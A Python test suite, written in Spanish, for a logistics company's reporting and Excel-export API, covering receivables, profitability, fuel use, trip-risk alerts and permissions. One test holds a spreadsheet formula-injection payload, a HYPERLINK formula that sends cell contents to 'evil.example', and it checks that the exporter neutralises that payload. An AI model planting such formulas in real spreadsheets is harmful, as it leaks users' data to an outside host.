"""Reportes y Excel (spec 015) sobre el modelo de lectura."""

from datetime import timedelta
from io import BytesIO
from uuid import uuid4

from openpyxl import load_workbook

from app.aplicacion.consultas import hoy
from app.aplicacion.prediccion import recalcular_riesgo
from app.aplicacion.puertos import Prediccion, SinModelos
from app.infraestructura.bd import transaccion
from tests.conftest import ejemplo, token
from tests.test_alertas import procesar

AGROEXPORT = "0193a000-0000-7000-8000-0000000c0001"
MOROSO = "0193a000-0000-7000-8000-0000000c0002"


def facturas():
    h = hoy()
    eventos = [ejemplo("ClienteActualizado", clienteId=AGROEXPORT, razonSocial="Agroexport SRL")]
    eventos.append(ejemplo("ClienteActualizado", clienteId=MOROSO, razonSocial="Agro Moroso"))
    for numero, cliente, monto, vence in [
        ("FAC-1", MOROSO, "5000.00", -20),
        ("FAC-2", AGROEXPORT, "7600.00", 2),
        ("FAC-3", AGROEXPORT, "2800.00", 5),
        ("FAC-4", AGROEXPORT, "1000.00", 30),
    ]:
        eventos.append(
            ejemplo(
                "FacturaEmitida",
                facturaId=str(uuid4()),
                numero=numero,
                clienteId=cliente,
                monto={"monto": monto, "moneda": "BOB"},
                emitidaEl=(h - timedelta(days=10)).isoformat(),
                venceEl=(h + timedelta(days=vence)).isoformat(),
            )
        )
    procesar(*eventos)


def test_fm4_cuentas_por_cobrar_esta_semana_y_excel(cliente):
    facturas()
    h = hoy()
    url = f"/api/v1/reportes/CUENTAS_POR_COBRAR?desde={h}&hasta={h + timedelta(days=6)}"
    r = cliente.get(url, headers=token("gerente"))
    assert r.status_code == 200, r.text
    cuerpo = r.json()
    assert [f["factura"] for f in cuerpo["filas"]] == ["FAC-2", "FAC-3"]
    assert cuerpo["totales"] == {"saldo": "10400.00", "facturas": 2}
    assert cuerpo["grafico"]["datos"] == [{"cliente": "Agroexport SRL", "saldo": "10400.00"}]
    assert cliente.get(url, headers=token("jefe_flota")).json()["codigo"] == "SIN_PERMISO"

    yo = token("gerente", sub="g1")
    pedido = {"reporteId": "CUENTAS_POR_COBRAR", "parametros": {"desde": str(h), "hasta": str(h + timedelta(days=6))}}
    clave = {"Idempotency-Key": str(uuid4())}
    creada = cliente.post("/api/v1/exportaciones", json=pedido, headers={**yo, **clave})
    assert creada.status_code == 201, creada.text
    assert cliente.post("/api/v1/exportaciones", json=pedido, headers={**yo, **clave}).json() == creada.json()
    e = creada.json()
    assert e["nombreArchivo"] == f"cuentas-por-cobrar-{h}.xlsx"

    archivo = f"/api/v1/exportaciones/{e['exportacionId']}/archivo"
    servicio = token(azp="gateway")
    assert cliente.get(archivo, headers={**yo, "X-Solicitante-Sub": "g1"}).status_code == 403
    assert cliente.get(archivo, headers={**servicio, "X-Solicitante-Sub": "otro"}).status_code == 403
    xlsx = cliente.get(archivo, headers={**servicio, "X-Solicitante-Sub": "g1"})
    assert xlsx.status_code == 200 and xlsx.headers["cache-control"] == "no-store"
    libro = load_workbook(BytesIO(xlsx.content))
    assert libro.sheetnames == ["Datos", "Parámetros"]
    filas = list(libro["Datos"].values)
    assert filas[0][:2] == ("Cliente", "Factura") and filas[-1][0] == "Total" and float(filas[-1][3]) == 10400


def test_rangos_y_vencidas(cliente):
    facturas()
    h = hoy()
    gerente = token("gerente")
    largo = cliente.get(
        f"/api/v1/reportes/CUENTAS_POR_COBRAR?desde={h}&hasta={h + timedelta(days=92)}", headers=gerente
    )
    assert largo.status_code == 400 and largo.json()["errores"][0]["campo"] == "desde"
    mes = f"desde={h - timedelta(days=30)}&hasta={h}"
    con = cliente.get(f"/api/v1/reportes/CUENTAS_POR_COBRAR?{mes}", headers=gerente).json()
    sin = cliente.get(f"/api/v1/reportes/CUENTAS_POR_COBRAR?{mes}&incluirVencidas=false", headers=gerente).json()
    assert [f["vencida"] for f in con["filas"]] == [True] and sin["filas"] == []
    falta = cliente.get("/api/v1/reportes/FACTURACION_POR_CLIENTE", headers=gerente)
    assert falta.status_code == 400


def test_facturacion_por_cliente(cliente):
    facturas()
    h = hoy()
    r = cliente.get(
        f"/api/v1/reportes/FACTURACION_POR_CLIENTE?desde={h - timedelta(days=60)}&hasta={h}&clienteId={AGROEXPORT}",
        headers=token("administracion"),
    ).json()
    assert r["totales"]["facturado"] == "11400.00" and r["totales"]["facturas"] == 3


def test_rentabilidad_une_viajes_finanzas_y_flota(cliente):
    viaje = str(uuid4())
    ruta = "01933a00-0000-7000-8000-000000000004"
    procesar(
        ejemplo("RutaActualizada", rutaId=ruta),
        ejemplo("ViajeConfirmado", viajeId=viaje, rutaId=ruta),
        ejemplo("EntregaConfirmada", viajeId=viaje, kmRecorridos=120, entregadoEn=f"{hoy()}T15:00:00Z"),
        ejemplo("FacturaEmitida", facturaId=str(uuid4()), viajeId=viaje),
        ejemplo("CargaCombustibleRegistrada", cargaId=str(uuid4()), viajeId=viaje),
    )
    rango = f"desde={hoy() - timedelta(days=1)}&hasta={hoy() + timedelta(days=1)}"
    r = cliente.get(f"/api/v1/reportes/RENTABILIDAD?{rango}&agrupar=RUTA", headers=token("gerente")).json()
    (fila,) = r["filas"]
    assert (fila["grupo"], fila["ingreso"], fila["combustible"], fila["margen"]) == (
        "Aula",
        "2800.00",
        "675.07",
        "2124.93",
    )
    assert fila["bobPorKm"] == "17.71"


def test_consumo_combustible_por_placa(cliente):
    tracto = str(uuid4())
    procesar(
        ejemplo("CargaCombustibleRegistrada", tractoId=tracto, kilometraje=184320, registradaEn=f"{hoy()}T10:00:00Z"),
        ejemplo(
            "CargaCombustibleRegistrada",
            tractoId=tracto,
            cargaId=str(uuid4()),
            kilometraje=184770,
            litros=180,
            registradaEn=f"{hoy()}T18:00:00Z",
        ),
        ejemplo("CaidaCombustibleDetectada"),
    )
    r = cliente.get(
        f"/api/v1/reportes/CONSUMO_COMBUSTIBLE?desde={hoy() - timedelta(days=7)}&hasta={hoy()}&placa=4521KTR",
        headers=token("jefe_flota"),
    ).json()
    (fila,) = r["filas"]
    assert (fila["km"], fila["kmPorLitro"], fila["monto"], fila["anomalias"]) == (450, 2.5, "1350.14", 0)


def test_viajes_en_riesgo_y_alerta_unica(cliente):
    class Modelos(SinModelos):
        def retraso(self, variables):
            return Prediccion(0.83, [{"nombre": "Bloqueos en la bitácora", "aporte": 0.3}], "prueba-1")

    viaje = str(uuid4())
    procesar(
        ejemplo("RutaActualizada"),
        ejemplo("ViajeConfirmado", viajeId=viaje),
        ejemplo("ViajeIniciado", viajeId=viaje),
        modelos=Modelos(),
    )
    from datetime import UTC, datetime

    with transaccion() as s:
        for _ in range(3):
            recalcular_riesgo(s, Modelos(), viaje, datetime.now(UTC), forzar=True)
    r = cliente.get("/api/v1/reportes/VIAJES_EN_RIESGO", headers=token("despachador")).json()
    assert [(f["viajeId"], f["probabilidad"]) for f in r["filas"]] == [(viaje, 0.83)]
    alertas = cliente.get("/api/v1/alertas?estado=ABIERTA", headers=token("despachador")).json()["alertas"]
    assert [a["tipo"] for a in alertas] == ["RIESGO_RETRASO"]


def test_catalogo(cliente):
    r = cliente.get("/api/v1/reportes", headers=token("jefe_flota")).json()
    assert len(r["reportes"]) == 5
    assert r["reportes"][0]["parametros"]["required"] == ["desde", "hasta"]


def test_reporte_desconocido_es_404(cliente):
    r = cliente.get("/api/v1/reportes/NO_EXISTE", headers=token("gerente"))
    assert r.status_code == 404 and r.json()["codigo"] == "NO_ENCONTRADO"


def test_rentabilidad_por_viaje_agrupa_por_viaje_id(cliente):
    ruta = "01933a00-0000-7000-8000-000000000004"
    viajes = [str(uuid4()), str(uuid4())]
    eventos = [ejemplo("RutaActualizada", rutaId=ruta)]
    # Misma placa, misma ruta y mismo día: dos viajes son dos filas.
    for v in viajes:
        eventos += [
            ejemplo("ViajeConfirmado", viajeId=v, rutaId=ruta),
            ejemplo("EntregaConfirmada", viajeId=v, kmRecorridos=120, entregadoEn=f"{hoy()}T15:00:00Z"),
            ejemplo("FacturaEmitida", facturaId=str(uuid4()), viajeId=v),
        ]
    procesar(*eventos)
    rango = f"desde={hoy() - timedelta(days=1)}&hasta={hoy() + timedelta(days=1)}"
    r = cliente.get(f"/api/v1/reportes/RENTABILIDAD?{rango}&agrupar=VIAJE", headers=token("gerente")).json()
    assert sorted(f["viajeId"] for f in r["filas"]) == sorted(viajes)
    assert [f["viajes"] for f in r["filas"]] == [1, 1] and r["filas"][0]["grupo"] == r["filas"][1]["grupo"]


def test_excel_no_escribe_formulas_de_un_texto_del_cliente():
    from datetime import UTC, datetime

    from app.infraestructura.excel import libro

    malicioso = '=HYPERLINK("http://evil.example/?d="&A2,"Ver factura")'
    resultado = {
        "titulo": "Cuentas por cobrar",
        "parametros": {"desde": "2026-11-03"},
        "columnas": [{"clave": "cliente", "titulo": "Cliente", "tipo": "TEXTO"}],
        "filas": [{"cliente": malicioso}, {"cliente": "+591 7000"}, {"cliente": "@SUM(A1)"}, {"cliente": "Agroexport"}],
        "totales": {},
        "datosAl": None,
    }
    hoja = load_workbook(BytesIO(libro(resultado, "-sub", datetime.now(UTC))))["Datos"]
    celdas = [hoja.cell(fila, 1) for fila in range(2, 6)]
    assert [c.value for c in celdas] == [malicioso, "+591 7000", "@SUM(A1)", "Agroexport"]
    assert all(c.data_type == "s" for c in celdas)
    assert [c.quotePrefix for c in celdas] == [True, True, True, False]


def test_riesgo_sin_modelo_o_sin_ruta_es_503_dependencia(cliente, monkeypatch):
    viaje = str(uuid4())
    procesar(ejemplo("ViajeConfirmado", viajeId=viaje), ejemplo("ViajeIniciado", viajeId=viaje))
    r = cliente.get(f"/api/v1/predicciones/retraso/{viaje}", headers=token("despachador"))
    assert r.status_code == 503 and r.json()["codigo"] == "DEPENDENCIA_NO_DISPONIBLE"
    assert "modelo" in r.json()["detail"] and r.headers["retry-after"]

    class Cargados(SinModelos):
        cargados = True

    # Con el modelo cargado, lo que falta es la copia de la ruta: el mensaje no culpa al modelo.
    cliente.app.state.modelos = Cargados()
    r = cliente.get(f"/api/v1/predicciones/retraso/{viaje}", headers=token("despachador"))
    assert r.status_code == 503 and "modelo" not in r.json()["detail"] and "ruta" in r.json()["detail"]
